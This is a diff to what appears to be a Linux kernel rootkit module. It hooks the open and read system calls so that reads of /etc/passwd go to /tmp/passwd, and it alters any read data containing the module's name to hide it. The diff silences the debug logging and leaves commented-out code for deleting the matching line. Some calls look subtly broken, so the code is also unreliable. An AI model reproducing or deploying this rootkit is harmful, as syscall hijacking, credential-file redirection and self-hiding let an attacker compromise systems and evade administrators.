@@ -64,7 +64,7 @@ asmlinkage int (*original_call_open)(const char *pathname, int flags);
 //Define our new sneaky version of the 'open' sys_call_table
 asmlinkage int sneaky_sys_open(const char *pathname, int flags)
 {
-  printk(KERN_INFO "Open: Very, very Sneaky!\n");
+  //printk(KERN_INFO "Open: Very, very Sneaky!\n");
   
   if (strcmp(pathname,"/etc/passwd")==0)
     copy_to_user(pathname,"/tmp/passwd",11);
@@ -86,7 +86,7 @@ asmlinkage int (*original_call_read)(int fd, void *buf, size_t count);
 //Define our new sneaky version of the 'open' syscall
 asmlinkage int sneaky_sys_read(int fd, void *buf, size_t count)
 {
-  printk(KERN_INFO "Read: Very, very Sneaky!\n");
+  //printk(KERN_INFO "Read: Very, very Sneaky!\n");
   int nread= original_call_read(fd,buf,count);
 
   char* pcBuf=(char*) buf; 
@@ -98,7 +98,18 @@ asmlinkage int sneaky_sys_read(int fd, void *buf, size_t count)
   if (pch) // contains sneaky_mod
   {
     printk(KERN_INFO "Performing read replacement!\n");
-    strcpy (pch,"~~~~~~");
+    
+    // look for end of current line:
+    //char* EOL = strstr (pch,'\n');
+
+    //if (EOL)
+    //{
+      //printk(KERN_INFO "Found EOL. %p , %p ,%p\n",(void*)buf,(void*)pch,(void*)EOL);
+      //memcpy(pch,EOL+1,nread-(EOL-pch+1)); 
+    //}
+
+
+    //strcpy (pch,"~~~~~~");
   }
 
   return nread; 
